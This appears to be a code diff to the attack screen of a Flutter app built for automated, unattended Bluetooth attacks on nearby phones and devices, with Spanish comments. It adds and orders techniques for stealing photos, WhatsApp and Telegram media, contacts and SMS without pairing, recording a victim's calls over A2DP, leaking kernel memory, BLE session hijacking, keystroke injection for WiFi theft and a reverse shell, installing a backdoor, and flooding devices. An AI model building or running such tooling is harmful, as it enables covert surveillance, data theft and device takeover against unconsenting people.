@@ -261,44 +261,59 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
   static const _defaultMaxRetries = 2;
   static const _defaultRetryDelay = 2000; // 2s
 
-   static const Map<String, Map<String, int>> _attackConfigs = {
-     // Reconocimiento
-     'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
-     'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
-     'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
-     // Extracción OBEX
-     'file_exfil': {'timeout': 15000, 'retries': 2, 'delay': 3000},
-     'file_exfil_dir': {'timeout': 20000, 'retries': 2, 'delay': 3000},
-     'pbap_extract': {'timeout': 30000, 'retries': 2, 'delay': 3000},
-     // Bluesnarf (OBEX GET) - CVE-2003-0300
-     'obex_get': {'timeout': 15000, 'retries': 2, 'delay': 3000},
-     // OBEX over BLE (modern)
-     'obex_ble_transfer': {'timeout': 20000, 'retries': 2, 'delay': 3000},
-     // BLE exploits
-    'btlejack': {'timeout': 15000, 'retries': 2, 'delay': 2000},
-    'blur_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
-    'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
-    'blueborne': {'timeout': 12000, 'retries': 2, 'delay': 2000},
-    'ble_pairing': {'timeout': 10000, 'retries': 2, 'delay': 2000},
-    'ble_exploit': {'timeout': 10000, 'retries': 2, 'delay': 2000},
-    'ble_replay': {'timeout': 12000, 'retries': 1, 'delay': 2000},
-    // Inyección
-    'at_injection': {'timeout': 8000, 'retries': 2, 'delay': 1500},
-    'hid': {'timeout': 10000, 'retries': 2, 'delay': 1500},
-    'hid_inject': {'timeout': 10000, 'retries': 2, 'delay': 1500},
-    'rfcomm_inject': {'timeout': 10000, 'retries': 1, 'delay': 1000},
-    // Bypass
-    'bypass': {'timeout': 8000, 'retries': 2, 'delay': 1500},
-    'pin_crack': {'timeout': 60000, 'retries': 1, 'delay': 0},
-    // Avanzados
-    'mirror_profile': {'timeout': 15000, 'retries': 2, 'delay': 2000},
-    'spoofing': {'timeout': 8000, 'retries': 1, 'delay': 1000},
-    'opp_push': {'timeout': 8000, 'retries': 1, 'delay': 1000},
-    // Persistencia
-    'install_persistence': {'timeout': 20000, 'retries': 2, 'delay': 3000},
-    // DoS
-    'dos': {'timeout': 5000, 'retries': 1, 'delay': 0},
-  };
+    static const Map<String, Map<String, int>> _attackConfigs = {
+      // Reconocimiento
+      'sdp_discover': {'timeout': 5000, 'retries': 1, 'delay': 1000},
+      'full_scan': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+      'mediastore_enumerate': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+      // === CVE-2025-13834: RFCOMM Heartbleed (reconocimiento - memoria kernel) ===
+      'cve_2025_13834_heartbleed': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      // A2DP Sink Recording (captura audio)
+      'a2dp_record': {'timeout': 35000, 'retries': 2, 'delay': 3000},
+      'a2dp_stream': {'timeout': 350000, 'retries': 1, 'delay': 0},  // 5 min max
+      // GATT Bulk Read
+      'gatt_bulk_read': {'timeout': 20000, 'retries': 2, 'delay': 2000},
+      'gatt_monitor': {'timeout': 35000, 'retries': 1, 'delay': 0},
+      // MAP Extraction (SMS/MMS)
+      'map_extract': {'timeout': 20000, 'retries': 2, 'delay': 2000},
+      'map_folders': {'timeout': 10000, 'retries': 1, 'delay': 1000},
+      // Extracción OBEX
+      'file_exfil': {'timeout': 15000, 'retries': 2, 'delay': 3000},
+      'file_exfil_dir': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+      'pbap_extract': {'timeout': 30000, 'retries': 2, 'delay': 3000},
+      // Bluesnarf (OBEX GET) - CVE-2003-0300
+      'obex_get': {'timeout': 15000, 'retries': 2, 'delay': 3000},
+      // OBEX over BLE (modern)
+      'obex_ble_transfer': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+      // BLE exploits
+     'btlejack': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+     'blur_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
+     'sweyntooth_attack': {'timeout': 8000, 'retries': 2, 'delay': 2000},
+     'blueborne': {'timeout': 12000, 'retries': 2, 'delay': 2000},
+     'ble_pairing': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+     'ble_exploit': {'timeout': 10000, 'retries': 2, 'delay': 2000},
+     'ble_replay': {'timeout': 12000, 'retries': 1, 'delay': 2000},
+      // Inyección
+      'at_injection': {'timeout': 8000, 'retries': 2, 'delay': 1500},
+      'hid': {'timeout': 10000, 'retries': 2, 'delay': 1500},
+      'hid_inject': {'timeout': 10000, 'retries': 2, 'delay': 1500},
+      'rfcomm_inject': {'timeout': 10000, 'retries': 1, 'delay': 1000},
+      // === CVE-2024-43770: HID Remote Code Execution ===
+      'cve_2024_43770_hid_rce': {'timeout': 15000, 'retries': 2, 'delay': 1500},
+      // Bypass
+      'bypass': {'timeout': 8000, 'retries': 2, 'delay': 1500},
+      'pin_crack': {'timeout': 60000, 'retries': 1, 'delay': 0},
+      // === CVE-2025-36911: Fast Pair Authentication Bypass ===
+      'cve_2025_36911_fastpair': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      // Avanzados
+      'mirror_profile': {'timeout': 15000, 'retries': 2, 'delay': 2000},
+      'spoofing': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+      'opp_push': {'timeout': 8000, 'retries': 1, 'delay': 1000},
+      // Persistencia
+      'install_persistence': {'timeout': 20000, 'retries': 2, 'delay': 3000},
+      // DoS
+      'dos': {'timeout': 5000, 'retries': 1, 'delay': 0},
+    };
 
   final RealExploitService _exploitService = RealExploitService();
   final IntegratedAIService _aiService = IntegratedAIService();
@@ -443,6 +458,7 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
                   t['type'] as String,
                   command: t['command'] as String?,
                   script: t['script'] as String?,
+                  extra: t as Map<String, dynamic>?,
                   fromAutomated: true,
                 )));
            // Pequeña pausa entre lotes para permitir recuperación
@@ -454,23 +470,24 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
          _appendLog('📦 Fase $phase: ${phaseTechniques.length} ataques secuenciales');
          for (final t in phaseTechniques) {
            if (!_isUnattendedRunning) break;
-            await _attack(
-              t['type'] as String,
-              command: t['command'] as String?,
-              script: t['script'] as String?,
-              fromAutomated: true,
-            );
+          await _attack(
+            t['type'] as String,
+            command: t['command'] as String?,
+            script: t['script'] as String?,
+            extra: t as Map<String, dynamic>?,
+            fromAutomated: true,
+          );
          }
        }
      }
    }
 
-  // Todas las técnicas de ataque disponibles (incluyendo CVEs modernos)
-  static const allAttackTechniques = [
-    // ===== RECONOCIMIENTO =====
-    {'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP', 'cve': '', 'category': 'recon', 'desc': 'Service Discovery Protocol'},
-    
-    // ===== EXTRACCIÓN DE DATOS (OBEX) =====
+   // Todas las técnicas de ataque disponibles (incluyendo CVEs modernos)
+   static const allAttackTechniques = [
+     // === CVE-2025-13834: RFCOMM Heartbleed (crítica) ===
+     {'type': 'cve_2025_13834_heartbleed', 'name': 'HEARTBLEED', 'cve': 'CVE-2025-13834', 'category': 'recon', 'desc': 'RFCOMM Heartbleed - fuga memoria kernel (127 bytes)'},
+     
+     // ===== EXTRACCIÓN DE DATOS (OBEX) =====
     {'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'cve': '', 'category': 'data', 'desc': 'Phonebook Completo'},
     {'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Robo contactos OBEX'},
     {'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'category': 'data', 'desc': 'BlueSnarf - Calendario'},
@@ -489,21 +506,27 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     // ===== OBEX OVER BLE (MODERNO) =====
     {'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE', 'cve': '', 'category': 'data_ble', 'desc': 'OBEX via BLE GATT'},
     
-    // ===== EXTRACCIÓN MEDIASTORE (ANDROID 11+) =====
-    {'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'cve': '', 'category': 'data_mediastore', 'desc': 'Enumerate MediaStore images'},
-    {'type': 'mediastore_extract', 'name': 'MEDIASTORE_EXTRACT', 'cve': '', 'category': 'data_mediastore', 'desc': 'Extract MediaStore file'},
-    
-    // ===== INYECCIÓN (HID/AT) =====
+     // ===== EXTRACCIÓN MEDIASTORE (ANDROID 11+) =====
+     {'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'cve': '', 'category': 'data_mediastore', 'desc': 'Enumerate MediaStore images'},
+     {'type': 'mediastore_extract', 'name': 'MEDIASTORE_EXTRACT', 'cve': '', 'category': 'data_mediastore', 'desc': 'Extract MediaStore file'},
+     
+     // ===== MAP (MESSAGE ACCESS PROFILE) =====
+     {'type': 'map_extract', 'name': 'MAP_EXTRACT', 'cve': '', 'category': 'data', 'desc': 'Extract SMS/MMS via MAP'},
+     {'type': 'map_folders', 'name': 'MAP_FOLDERS', 'cve': '', 'category': 'recon', 'desc': 'Enumerate MAP folders'},
+     
+     // ===== INYECCIÓN (HID/AT) =====
     {'type': 'at_injection', 'name': 'AT_INJECTION', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Command Injection'},
     {'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'cve': 'CVE-2006-1367', 'category': 'injection', 'desc': 'AT Marcar numero'},
     {'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir notepad'},
     {'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Exfiltrar WiFi'},
     {'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Abrir terminal'},
     {'type': 'hid', 'script': 'reverse', 'name': 'HID_REVERSE', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID - Reverse shell'},
-    {'type': 'hid_inject', 'name': 'HID_INJECT', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID Keystroke Injection'},
-    {'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'cve': 'CVE-2003-0301', 'category': 'injection', 'desc': 'Bluebugging AT via RFCOMM'},
-    
-    // ===== BLE (Bluetooth Low Energy) =====
+     {'type': 'hid_inject', 'name': 'HID_INJECT', 'cve': 'CVE-2023-45866', 'category': 'injection', 'desc': 'HID Keystroke Injection'},
+     {'type': 'rfcomm_inject', 'name': 'BLUEBUGGING', 'cve': 'CVE-2003-0301', 'category': 'injection', 'desc': 'Bluebugging AT via RFCOMM'},
+     // === CVE-2024-43770: HID Remote Code Execution ===
+     {'type': 'cve_2024_43770_hid_rce', 'name': 'HID_RCE', 'cve': 'CVE-2024-43770', 'category': 'injection', 'desc': 'HID Remote Code Execution - ejecución arbitraria'},
+     
+     // ===== BLE (Bluetooth Low Energy) =====
     {'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'cve': '', 'category': 'ble', 'desc': 'BLE Scan'},
     {'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'cve': '', 'category': 'ble', 'desc': 'BLE Sniff traffic'},
     {'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'cve': '', 'category': 'ble', 'desc': 'BLE Session hijack'},
@@ -525,12 +548,14 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     {'type': 'a2dp_inject', 'name': 'A2DP_INJECT', 'cve': '', 'category': 'advanced', 'desc': 'A2DP audio injection'},
     
     // ===== BYPASS AUTH =====
-    {'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'cve': 'CVE-2020-10135', 'category': 'bypass', 'desc': 'BIAS - Quick connect race'},
-    {'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'cve': '', 'category': 'bypass', 'desc': 'MAC spoofing'},
-    {'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'cve': '', 'category': 'bypass', 'desc': 'OBEX trust abuse'},
-    {'type': 'pin_crack', 'name': 'PIN_BRUTE', 'cve': '', 'category': 'bypass', 'desc': 'PIN brute force'},
-    
-    // ===== DoS =====
+     {'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'cve': 'CVE-2020-10135', 'category': 'bypass', 'desc': 'BIAS - Quick connect race'},
+     {'type': 'bypass', 'command': 'mac_spoof', 'name': 'BYPASS_MAC', 'cve': '', 'category': 'bypass', 'desc': 'MAC spoofing'},
+     {'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'cve': '', 'category': 'bypass', 'desc': 'OBEX trust abuse'},
+     {'type': 'pin_crack', 'name': 'PIN_BRUTE', 'cve': '', 'category': 'bypass', 'desc': 'PIN brute force'},
+     // === CVE-2025-36911: Fast Pair Authentication Bypass ===
+     {'type': 'cve_2025_36911_fastpair', 'name': 'FASTPAIR_BYPASS', 'cve': 'CVE-2025-36911', 'category': 'bypass', 'desc': 'Fast Pair Account Key spoofing - pairing sin confirmación'},
+     
+     // ===== DoS =====
     {'type': 'dos', 'command': 'gatt_flood', 'name': 'DOS_GATT', 'cve': 'CVE-2020-12351', 'category': 'dos', 'desc': 'GATT flood'},
     {'type': 'dos', 'command': 'l2cap_flood', 'name': 'DOS_L2CAP', 'cve': '', 'category': 'dos', 'desc': 'L2CAP flood'},
     {'type': 'dos', 'command': 'mtu_crash', 'name': 'DOS_MTU', 'cve': '', 'category': 'dos', 'desc': 'MTU crash'},
@@ -544,9 +569,17 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
     {'type': 'hfp_inject', 'script': 'voice', 'name': 'HFP_VOICE', 'cve': '', 'category': 'injection', 'desc': 'HFP voice injection'},
     {'type': 'gatt_write', 'command': 'exploit', 'name': 'GATT_WRITE', 'cve': '', 'category': 'ble', 'desc': 'GATT characteristic write exploit'},
     {'type': 'ble_implement', 'name': 'BLE_IMPLEMENT', 'cve': '', 'category': 'ble', 'desc': 'BLE implementation exploit'},
-    {'type': 'rfcomm_exploit', 'name': 'RFCOMM_EXPLOIT', 'cve': '', 'category': 'advanced', 'desc': 'RFCOMM protocol exploit'},
+     {'type': 'rfcomm_exploit', 'name': 'RFCOMM_EXPLOIT', 'cve': '', 'category': 'advanced', 'desc': 'RFCOMM protocol exploit'},
 
-    // ===== PERSISTENCIA =====
+     // ===== NUEVAS TÉCNICAS DE EXTRACCIÓN AVANZADA =====
+     // A2DP Sink Recording - captura audio del dispositivo fuente
+     {'type': 'a2dp_record', 'name': 'A2DP_RECORD', 'cve': 'A2DP-SINK-RECORD', 'category': 'audio', 'desc': 'A2DP Sink audio recording (30s)'},
+     {'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'cve': 'A2DP-SINK-RECORD', 'category': 'audio', 'desc': 'A2DP continuous streaming (max 5 min)'},
+     // GATT Bulk Read - lectura masiva de características
+     {'type': 'gatt_bulk_read', 'name': 'GATT_BULK', 'cve': '', 'category': 'ble', 'desc': 'Read all GATT characteristics'},
+     {'type': 'gatt_monitor', 'name': 'GATT_MON', 'cve': '', 'category': 'ble', 'desc': 'Monitor GATT notifications'},
+
+     // ===== PERSISTENCIA =====
     {'type': 'install_persistence', 'name': 'INSTALL_BACKDOOR', 'cve': '', 'category': 'persistence', 'desc': 'Install backdoor service'},
   ];
 
@@ -556,18 +589,35 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
    List<Map<String, dynamic>> _getAdaptiveAttackSequence(String deviceType) {
      List<Map<String, dynamic>> sequence = [];
      final deviceInfo = _reconnaissanceResults ?? {};
-     final deviceType_lower = deviceType.toLowerCase();
+      final deviceType_lower = deviceType.toLowerCase();
 
-     // ==========================================
-     // FASE 1: RECONOCIMIENTO (paralelo, no invasivo)
-     // ==========================================
-     sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
-     sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
+       // ==========================================
+       // FASE 1: RECONOCIMIENTO (paralelo, no invasivo)
+       // ==========================================
+       sequence.add({'type': 'sdp_discover', 'command': 'scan', 'name': 'SDP_SCAN', 'phase': 1, 'timeout': 5000, 'retries': 1});
+       sequence.add({'type': 'sdp_enumerate', 'command': 'all', 'name': 'SDP_ENUM', 'phase': 1, 'timeout': 8000, 'retries': 1});
+       sequence.add({'type': 'full_scan', 'name': 'FULL_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 2});
 
-     // MediaStore solo para Android (rápido, alto valor)
-     if (deviceInfo['androidVersion'] != null) {
-       sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
-     }
+        // === CVE-2025-13834: RFCOMM Heartbleed (crítica - fuga de memoria kernel) ===
+        // Sin pairing, extrae 127 bytes por iteración (credenciales, punteros, claves)
+        sequence.add({'type': 'cve_2025_13834_heartbleed', 'iterations': 20, 'name': 'HEARTBLEED_13834', 'phase': 1, 'timeout': 15000, 'retries': 2});
+
+        // GATT Bulk Read - extrae todas las características GATT (datos de sensores, firmware, config)
+        if (deviceInfo['hasBle'] == true) {
+          sequence.add({'type': 'gatt_bulk_read', 'name': 'GATT_BULK_READ', 'phase': 1, 'timeout': 20000, 'retries': 2});
+        }
+
+        // MediaStore solo para Android (rápido, alto valor)
+       if (deviceInfo['androidVersion'] != null) {
+         sequence.add({'type': 'mediastore_enumerate', 'name': 'MEDIASTORE_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+         sequence.add({'type': 'app_data_scan', 'name': 'APP_DATA_SCAN', 'phase': 1, 'timeout': 15000, 'retries': 2});
+       }
+
+      // Red scan para Android (requiere location permission)
+      if (deviceInfo['androidVersion'] != null) {
+        sequence.add({'type': 'network_scan', 'name': 'NETWORK_SCAN', 'phase': 1, 'timeout': 10000, 'retries': 1});
+        sequence.add({'type': 'wifi_scan', 'name': 'WIFI_SCAN', 'phase': 1, 'timeout': 8000, 'retries': 1});
+      }
 
      // ==========================================
      // FASE 2: EXTRACCIÓN DE DATOS (paralelo)
@@ -588,63 +638,91 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
 
      final shouldTryObex = hasObex || (isDataCapable && !isAudioDevice);
 
-     if (shouldTryObex) {
-       // Scan OBEX primero
-       sequence.add({'type': 'file_exfil', 'command': 'scan', 'name': 'OBEX_SCAN', 'phase': 2, 'timeout': 15000, 'retries': 2});
-       // Directorios priorizados (en orden de valor)
-       final priorityDirs = [
-         'DCIM/Camera',      // Fotos recientes (máximo valor)
-         'DCIM',             // DCIM completo
-         'WhatsApp/Media',   // WhatsApp (alto valor)
-         'Pictures',         // Pictures
-         'Screenshots',      // Capturas de pantalla
-         'Download',         // Descargas
-         'Telegram',         // Telegram
-         'Documents',        // Documentos generales
-       ];
-       for (final dir in priorityDirs) {
-         sequence.add({'type': 'file_exfil_dir', 'command': dir, 'name': 'OBEX_${dir.toUpperCase().replaceAll('/', '_')}', 'phase': 2, 'timeout': 20000, 'retries': 2});
-       }
-     }
-
-      // PBAP para smartphones/tablets/Android/unknown
-      if (deviceType_lower.contains('smartphone') ||
-          deviceType_lower.contains('tablet') ||
-          hasAndroid ||
-          isDataCapable) {
-        sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
-      }
-
-      // ===== BLUESNARF (OBEX GET) - extracción directa de archivos OBEX sin autenticación =====
-      // CVE-2003-0300: BlueSnarf - acceso a telecom/pb.vcf y telecom/cal.vcf
       if (shouldTryObex) {
-        sequence.add({'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF_PB', 'cve': 'CVE-2003-0300', 'phase': 2, 'timeout': 15000, 'retries': 2});
-        sequence.add({'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CAL', 'cve': 'CVE-2003-0300', 'phase': 2, 'timeout': 15000, 'retries': 2});
-        // Directory traversal OBEX (CVE-2009-0244)
-        sequence.add({'type': 'obex_get', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'cve': 'CVE-2009-0244', 'phase': 2, 'timeout': 15000, 'retries': 2});
+        // Scan OBEX primero (listar todo)
+        sequence.add({'type': 'obex_extract', 'command': 'scan', 'name': 'OBEX_EXTRACT_ALL', 'phase': 2, 'timeout': 15000, 'retries': 2});
+
+        // === BLUESNARF - EXTRACCIÓN DIRECTA DE CONTACTOS/CALENDARIO (CVE-2003-0300) ===
+        sequence.add({'type': 'obex_get', 'command': 'telecom/pb.vcf', 'name': 'BLUESNARF_CONTACTS', 'phase': 2, 'timeout': 15000, 'retries': 2});
+        sequence.add({'type': 'obex_get', 'command': 'telecom/cal.vcf', 'name': 'BLUESNARF_CALENDAR', 'phase': 2, 'timeout': 15000, 'retries': 2});
+
+        // Directory Traversal OBEX (CVE-2009-0244)
+        sequence.add({'type': 'file_exfil_dir', 'command': '../..', 'name': 'OBEX_TRAVERSAL', 'phase': 2, 'timeout': 15000, 'retries': 2});
+
+        // Directorios priorizados (en orden de valor)
+        final priorityDirs = [
+          'DCIM/Camera',      // Fotos recientes (máximo valor)
+          'DCIM',             // DCIM completo
+          'WhatsApp/Media',   // WhatsApp (alto valor)
+          'Pictures',         // Pictures
+          'Screenshots',      // Capturas de pantalla
+          'Download',         // Descargas
+          'Telegram',         // Telegram
+          'Documents',        // Documentos generales
+        ];
+        for (final dir in priorityDirs) {
+          sequence.add({'type': 'file_exfil_dir', 'command': dir, 'name': 'OBEX_${dir.toUpperCase().replaceAll('/', '_')}', 'phase': 2, 'timeout': 20000, 'retries': 2});
+        }
+
+        // === OBEX OVER BLE (MODERNO) - EXTRACCIÓN via GATT ===
+        if (deviceInfo['hasBle'] == true) {
+          sequence.add({'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE_CAMERA', 'phase': 2, 'timeout': 20000, 'retries': 2});
+        }
       }
 
-      // ===== OBEX OVER BLE (MODERNO) - transferencia via BLE GATT =====
-      if (deviceInfo['hasBle'] == true) {
-        sequence.add({'type': 'obex_ble_transfer', 'command': '/DCIM/Camera', 'name': 'OBEX_BLE_CAMERA', 'phase': 2, 'timeout': 20000, 'retries': 2});
+       // PBAP para smartphones/tablets/Android/unknown
+       if (deviceType_lower.contains('smartphone') ||
+           deviceType_lower.contains('tablet') ||
+           hasAndroid ||
+           isDataCapable) {
+         sequence.add({'type': 'pbap_extract', 'command': 'all', 'name': 'PBAP_ALL', 'phase': 2, 'timeout': 30000, 'retries': 2});
+       }
+
+       // === MAP (Message Access Profile) - extrae SMS/MMS ===
+       // Solo si tiene Android y es smartphone/tablet (SMS)
+       if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || hasAndroid) {
+         sequence.add({'type': 'map_extract', 'name': 'MAP_SMS_EXTRACT', 'phase': 2, 'timeout': 20000, 'retries': 2});
+         sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 1, 'timeout': 10000, 'retries': 1});
+       }
+
+      // ==========================================
+      // FASE 2: BYPASS DE AUTHENTICACIÓN (paralelo, intentar ANTES de extracción)
+      // ==========================================
+      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('unknown')) {
+        // Intentar bypass de OBEX trust (sin pairing)
+        sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 2, 'timeout': 8000, 'retries': 1});
+        // Intentar quick connect race
+        sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 2, 'timeout': 8000, 'retries': 2});
       }
 
       // ==========================================
       // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
       // ==========================================
-     if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
-       // Escaneo BLE básico
-       sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
-       sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
-       // Ataques BLE modernos
-       sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
-       sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
-       sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
-       // BLE pairing bypass
-       sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-       sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-       sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
-     }
+      if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
+        // Escaneo BLE básico
+        sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
+        // Ataques BLE avanzados (session hijack, jamming, MITM)
+        sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
+        sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
+        // BLUR + SweynTooth (BLE 5.x modern exploits)
+        sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
+        sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
+        // BlueBorne (L2CAP, no pairing)
+        sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
+        // BLE pairing bypass attempts
+        sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+        // BLE GATT replay attack
+        sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
+
+        // === A2DP SINK RECORDING - captura audio del dispositivo ===
+        // Graba llamadas/música/videollamadas del dispositivo víctima
+        sequence.add({'type': 'a2dp_record', 'duration': 30, 'name': 'A2DP_RECORD_30S', 'phase': 3, 'timeout': 35000, 'retries': 2});
+        // Streaming continuo (máx 5 min)
+        sequence.add({'type': 'a2dp_stream', 'name': 'A2DP_STREAM', 'phase': 3, 'timeout': 350000, 'retries': 1});
+      }
 
      // ==========================================
      // FASE 4: INYECCIÓN Y ATAQUES AVANZADOS (secuencial - pueden interferir)
@@ -655,27 +733,40 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
        sequence.add({'type': 'at_injection', 'command': 'ATD', 'name': 'AT_CALL', 'phase': 4, 'timeout': 5000, 'retries': 1});
      }
 
-     // HID Injection (teclado humano)
-     if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('laptop')) {
-       sequence.add({'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'phase': 4, 'timeout': 10000, 'retries': 2});
-       sequence.add({'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'phase': 4, 'timeout': 10000, 'retries': 2});
-       sequence.add({'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'phase': 4, 'timeout': 12000, 'retries': 2});
-       sequence.add({'type': 'hid_inject', 'name': 'HID_INJECT', 'phase': 4, 'timeout': 10000, 'retries': 2});
-     }
+      // HID Injection (teclado humano)
+      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('laptop')) {
+        sequence.add({'type': 'hid', 'script': 'notepad', 'name': 'HID_NOTEPAD', 'phase': 4, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'hid', 'script': 'terminal', 'name': 'HID_TERMINAL', 'phase': 4, 'timeout': 10000, 'retries': 2});
+        sequence.add({'type': 'hid', 'script': 'wifi', 'name': 'HID_WIFI', 'phase': 4, 'timeout': 12000, 'retries': 2});
+        sequence.add({'type': 'hid_inject', 'name': 'HID_INJECT', 'phase': 4, 'timeout': 10000, 'retries': 2});
+      }
 
